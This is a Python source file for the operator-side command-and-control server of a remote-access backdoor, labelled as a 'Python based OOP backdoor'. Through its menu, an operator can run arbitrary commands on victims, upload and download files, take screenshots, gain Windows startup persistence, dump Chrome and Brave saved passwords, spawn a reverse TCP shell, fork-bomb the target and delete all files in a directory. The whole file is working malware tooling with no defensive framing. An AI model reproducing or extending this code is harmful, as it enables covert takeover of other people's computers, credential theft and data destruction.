import socket
import sys
import time
import os
import subprocess
import pickle
import base64


class TcpServer:

    def __init__(self):
        # self.ok = None
        print("""\033[1;36m
 _______               __         __ __
|    ___|.--.--.-----.|  |.-----.|__|  |_
|    ___||_   _|  _  ||  ||  _  ||  |   _|
|_______||__.__|   __||__||_____||__|____|
               |__|    \033[0;0m""")
        try:
            self.host = input("\033[1;36mPut here the LHOST IP:\033[0;0m ")
            self.port = int(input("\033[1;36mPut here the LHOST Port:\033[0;0m "))

            if self.host == "":
                print("\033[1;36mNo host Especified! Exiting...\033[0;0m")
                sys.exit()

            # self.hostname = socket.gethostname()

        except KeyboardInterrupt:
            print("\nExiting... Bye o/")
            sys.exit()

    def display(self):
        exploit = ["L", "a", "u", "n", "c", "h", "i", "n", "g", " ", "S", "e", "r", "v", "e", "r", ".", ".", "."]

        # display with one upper char

        for x in range(len(exploit)):
            # remeber lower char
            old = exploit[x]

            # replace with upper char
            exploit[x] = old.upper()

            # create full text
            text = "".join(exploit)

            # display full text
            sys.stdout.write("\r")
            sys.stdout.write(f"\033[1;36m{text}\033[0;0m")
            sys.stdout.flush()

            # put back lower char
            exploit[x] = old

            time.sleep(0.2)

        # display without upper chars at the end

        text = "".join(exploit)

        sys.stdout.write("\r")
        sys.stdout.write(f"\033[1;36m{text}\033[0;0m")
        sys.stdout.flush()
        print("""\n\033[1;32m

                              ____    .-.
                     .-"`    `",( __\_
      .-==:;-._    .'         .-.     `'.
    .'      `"-:'-/          (  \} -=a  .)
   /            \/       \,== `-  __..-'`
'-'              |       |   |  .'\ `;
                  \    _/---'\ (   `"`
                 /.`._ )      \ `;
                 \`-/.'        `"`
                  `"\`-.
                jg\033[0;0m

+------------------------------------------------------------+
| \033[1;31m* Python based OOP backdoor made by --> f3rr3ira\033[0;0m           |
+------------------------------------------------------------+
| \033[1;31m* version 1.0\033[0;0m                                              |
| \033[1;31m* Github --> https://github.com/ferreiraklet\033[0;0m               |
| \033[1;31m* Type list For Help\033[0;0m                                       |
+------------------------------------------------------------+
""")

    def show(self):
        time.sleep(0.5)
        print(f"\033[1;32m[+]\033[0;0m --> Server Started on {self.host}!")
        print("\033[1;32m[+]\033[0;0m --> Listening For Client Connection...")

    def bytes_handler(self, by, cat: bool):
        self.byheader = b""
        # if x self.pickle.header else self.client.recv, tomar cuidado com encodacao do pickle
        self.data = []
        while len(self.byheader) < int(by):
            self.byheader += self.client.recv(int(by))
            self.data.append(self.byheader)
        # data_arr = pickle.loads(b"".join(data))
        if cat == True:
            print(self.byheader.decode("latin1"))

    def pickle_handler(self, command):
        return base64.b64encode(pickle.dumps(command))

    def dependences(self, command):
        self.client.send(self.pickle_handler(command))
        time.sleep(5)
        done = self.pickle_recv(1024)
        print(done)

    def pickle_recv(self, b):
        recv = self.client.recv(b).decode("latin1")
        return pickle.loads(base64.b64decode(recv))

    def screenshot(self, command):
        self.client.send(self.pickle_handler(command))
        print("\033[0;31m[+]\033[0;0m - Waiting File Size...")
        time.sleep(2)
        screenshot_size = self.client.recv(1024).decode("latin1")
        int_screenshot_size = int(screenshot_size)

        print("\033[0;31m[+]\033[0;0m - Receiving Data...\n")
        time.sleep(2)
        self.bytes_handler(int_screenshot_size, False)
        with open("extscreenshot.png", "wb") as sc:
            sc.write(self.byheader)
        print(
            f"\033[1;32m[+]\033[0;0m - Screenshot Download finished! File Size: {str(int_screenshot_size)} \nGoing Back to Input...")
        # self.ok = True

    def permanence_mode(self, command):
        self.client.send(self.pickle_handler(command))
        self.client.send("OK".encode("latin1"))
        print("[*] - This may take some time!...")
        time.sleep(300)  # comment this test
        reg_message = self.client.recv(1024).decode("latin1")
        if reg_message.startswith("g"):
            reg_message = pickle.loads(base64.b64decode(reg_message))
            print(reg_message)
        else:
            print(reg_message)
        # self.ok = True

    def grab(self, command):
        self.client.send(self.pickle_handler(command))

        time.sleep(4)
        passwd = self.client.recv(1024).decode("latin1")
        print(passwd)

    def disable_permanence(self, command):
        self.client.send(self.pickle_handler(command))
        print("Sent!")
        time.sleep(2)
        desactivated = self.pickle_recv(1024)
        print(desactivated)
        # self.ok = True

    def upload(self, command, filename):
        try:
            self.client.send(self.pickle_handler(str(command)))

            data = os.path.getsize(str(filename))
            self.client.send(str(data).encode("latin1"))
            # print(data)
            time.sleep(11)

            with open(filename, "rb") as fl:
                filedata = fl.read()
                self.client.send(filedata)

            transference_done = self.pickle_recv(1024)
            print(transference_done)
            # self.ok = True

        except IsADirectoryError:
            print("\033[0;31m[!]\033[0;0m - Incorrect file type, Need to especify a file! Backing to input...")
        except Exception as e:
            print("SOmething went wrong!\nError: ", str(e))

    def download(self, command, filename):
        self.client.send(self.pickle_handler(command))
        print("\033[0;31m[+]\033[0;0m - Waiting File Size...")

        try:
            filesize = self.pickle_recv(1024)
            int_filesize = int(filesize)

            print("\033[0;31m[+]\033[0;0m - Receiving Data...\n")

            self.bytes_handler(int_filesize, False)

            with open(filename, "wb") as f:
                # self.byheader = pickle.loads(base64.b64decode(self.byheader.decode("latin1")))
                f.write(self.byheader)

            print(
                f"\033[1;32m[+]\033[0;0m - Download to {filename} finished! File Size: {str(int_filesize)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...")
            # self.ok = True
        except IsADirectoryError:
            print("The Target's file is A directory!")

    def reverse_tcp(self, command):
        self.client.send(self.pickle_handler(command))
        rv = self.pickle_recv(1024)
        print(rv)

    def cat(self, command):
        self.client.send(self.pickle_handler(command))
        cat_size = self.pickle_recv(1024)

        self.bytes_handler(cat_size, True)
        # self.ok = True

    def listdir(self):
        """self.client.send(self.pickle_handler("dir"))
        bytes_lenght = self.client.recv(1024).decode("latin1")
        if not bytes_lenght.startswith("g"):
            int_bytes_lenght = int(bytes_lenght)
            time.sleep(2)
            response = self.client.recv(int_bytes_lenght).decode("latin1")
            print(response)
        else:
            print(pickle.loads(base64.b64decode(bytes_lenght)))"""
        self.client.send(self.pickle_handler("dir"))
        while True:
            lenght = self.client.recv(1024).decode("latin1")
            print(lenght)
            if lenght == "Done!":
                break

    def handle_connection(self):
        try:
            self.server = socket.socket()
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.host, self.port))
            self.server.listen(1)
        except KeyboardInterrupt:
            print("Exiting... Bye o/")
            sys.exit()

        except socket.error:
            print("\n\033[1;31m[!]\033[0;0m Server is not responding or doesn't exist")
            sys.exit()

        time.sleep(0.5)
        print("\n\033[31m[+] * \033[0;0mType list for command list\n\033[31m[+] * \033[0;0mWaiting for connection...")
        while True:
            try:
                self.client, self.client_ip = self.server.accept()
                # pty.spawn('/bin/bash')
                print(f"\n\033[1;36mConnection Received from {self.client_ip}\033[0;0m\n")
                print("\033[1;32m[+]\033[0;0m --> Starting RCE input -->\n\n")


            except KeyboardInterrupt:
                print("\nExiting... Bye o/")
                sys.exit()

            while True:
                # Input for terminal commands

                # o input ta quebrando com o cat, porque o input aparece mais rapido que o resultado inteiro do cat
                try:
                    message_command = input(f'\033[1;36m~meterpreter@{self.client_ip[0]}$\033[0;0m ')

                    if message_command == "upload":
                        print("You must specify a file!")

                    # need to pass 2 parameters, where is the file and the file: /home/file.txt, especify the name you want to the file to become, Ex: kleiton
                    elif message_command.startswith("upload "):
                        self.upload(message_command, message_command.split(" ")[1])

                    elif message_command == "permanence_mode":
                        self.permanence_mode(message_command)

                    elif message_command == "disable_permanence":
                        self.disable_permanence(message_command)

                    elif message_command == "grab_passwords":
                        self.grab(message_command)

                    elif message_command == "dir":
                        self.listdir()

                    elif message_command == "screenshot":
                        self.screenshot(message_command)

                    elif message_command == "download":
                        print("You must specify a file!")

                    elif message_command.startswith("download "):
                        self.download(message_command, message_command.split(" ")[1])

                    elif message_command == "cat":
                        print("You need to especify a file!")

                    elif message_command.startswith("cat "):
                        self.cat(message_command)

                    elif message_command.startswith("reverse_tcp"):
                        self.reverse_tcp(message_command)

                    # Exiting keyword
                    elif message_command == "exit":
                        print("Closing RCE... Bye o/")
                        self.client.send(self.pickle_handler("exit"))
                        self.server.close()
                        sys.exit()

                    elif message_command == "list":
                        print("""
            ---------------------------------------------
            \033[1;31mforkbomb --> Crash Target's machine
            victims_info --> Get some Target's info
            get_ip --> Get Target's ip
            remove_all --> Removes all files in currently directory
            reverse_tcp --> NetCat feature: Spawn Reverse TCP shell into specified IP and PORT
            download <file> --> Download files
            permanence_mode --> Make Backdoor to initiate in windows startup # requires the dependences!
            disable_permanence --> Disable Backdoor in windows Startup
            upload <path> <filename> --> upload files into client
            ex: upload /home/kleiton/Desktop/tools/ports.txt ports.txt 
            install_dependences --> install dependences on target's machine
            grab_passwords --> try to dump Google Chrome and Brave passwords # This requires the dependences!\033[0;0m
            ---------------------------------------------""")



                    elif message_command == "":
                        print("\n\033[1;36mMissing command!\033[0;0m")


                    elif message_command == "install_dependences":
                        self.dependences(message_command)



                    elif message_command == "clear" and sys.platform.startswith("Linux") == True:
                        os.popen("clear")


                    elif message_command == "clear" and sys.platform.startswith("Windows") == True:
                        subprocess.Popen(f"cls", stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                         shell=True)


                    else:
                        command_list = ("victims_info", "permanence_mode", "get_ip", "disable_permanence")
                        if message_command not in command_list:

                            meterpreter = self.pickle_handler(message_command)
                            self.client.send(meterpreter)
                            print("[*] - Command Sent!")

                            recv_message = self.client.recv(1024)
                            print(recv_message.decode("latin1"))
                        else:
                            meterpreter = self.pickle_handler(message_command)
                            self.client.send(meterpreter)
                            print("[*] - Command Sent!")

                            recv_message = self.pickle_recv(1024)
                            print(recv_message)


                except KeyboardInterrupt:
                    print("\nExiting... Bye o/")
                    exit(1)
                except BrokenPipeError:
                    print("\nConnection Stoped By the Client! Exiting...")
                    exit(1)
                except ConnectionResetError:
                    print("\nConnection Stoped By the Client! Exiting...")
                    exit(1)


object = TcpServer()
object.display()
object.show()
object.handle_connection()